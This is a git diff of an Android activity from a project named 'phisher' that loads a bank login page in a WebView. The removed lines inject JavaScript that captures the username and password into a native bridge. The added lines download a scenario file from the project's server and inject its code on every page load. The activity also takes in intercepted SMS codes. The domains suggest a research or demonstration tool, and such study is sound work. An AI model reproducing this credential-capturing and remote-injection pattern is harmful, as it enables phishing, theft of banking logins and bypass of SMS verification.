@@ -1,5 +1,6 @@
 package pl.jasiun.phisher;
 
+import java.net.URL;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -8,6 +9,7 @@ import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.content.Intent;
 import android.os.Bundle;
+import android.util.Log;
 import android.view.View;
 import android.view.View.OnClickListener;
 import android.webkit.WebView;
@@ -16,7 +18,7 @@ import android.widget.Button;
 import android.widget.Toast;
 
 @SuppressLint("SetJavaScriptEnabled")
-public class WebViewActivity extends Activity implements AndroidController {
+public class WebViewActivity extends Activity implements StageManager {
 	
 	private WebView webView;
 	
@@ -25,33 +27,21 @@ public class WebViewActivity extends Activity implements AndroidController {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_web_view);
         
-        scenario = new Scenario(this);
+        setContentView(R.layout.activity_web_view);
         
         webView = (WebView)findViewById(R.id.webView);
         getWebView().getSettings().setJavaScriptEnabled(true);
         
-        getWebView().setWebViewClient(new WebViewClient()
-        {
-        	    public boolean shouldOverrideUrlLoading(WebView webView, String url){
-        	    	webView.loadUrl(url);
-        	        return false;
-        	   }
-        	    
-        	    public void onPageFinished (WebView webView, String url) {
-        	    	webView.loadUrl("javascript:$('form').submit(function(){" +
-							"Android.save('username',$('#username').val());" +
-							"Android.save('password',$('#password').val());" +
-						"});");
-        	    	
-        	    	scenario.pageLoaded();
-        	    }
-        });
+        FileDownloadTask downloadScenarionTask = new FileDownloadTask() {
+			
+			@Override
+			protected void onPostExecute(byte[] result) {
+				scenarioDownloaded(result);				
+			}
+		};
+		downloadScenarionTask.execute("http://phisher.jasiun.pl/seabank.scenario.xml");
         
-        getWebView().addJavascriptInterface(new JavaScriptInterface(this), "Android");
-        
-        getWebView().loadUrl("http://seabank.jasiun.pl/ebanking/login/");
         Button button = (Button) findViewById(R.id.button);
         button.setOnClickListener(new OnClickListener() {
 			
@@ -61,6 +51,29 @@ public class WebViewActivity extends Activity implements AndroidController {
 			}
 		});
     }
+
+	private void scenarioDownloaded(byte[] result) {
+		final ScenarioParser scenarioParser = new ScenarioParser(result);
+		scenario = scenarioParser.getScenario(this);
+		
+		getWebView().setWebViewClient(new WebViewClient()
+        {
+        	    public boolean shouldOverrideUrlLoading(WebView webView, String url){
+        	    	webView.loadUrl(url);
+        	        return false;
+        	   }
+        	    
+        	    public void onPageFinished (WebView webView, String url) {
+        	    	webView.loadUrl(scenarioParser.getPermanentCode());
+        	    	
+        	    	scenario.pageLoaded();
+        	    }
+        });
+        
+        getWebView().addJavascriptInterface(new JavaScriptInterface(this), "Android");
+        
+        getWebView().loadUrl("http://seabank.jasiun.pl/ebanking/login/");
+	}
     
     protected void onNewIntent (Intent intent) {
     	scenario.smsReceived(intent.getExtras().getString("CODE"));
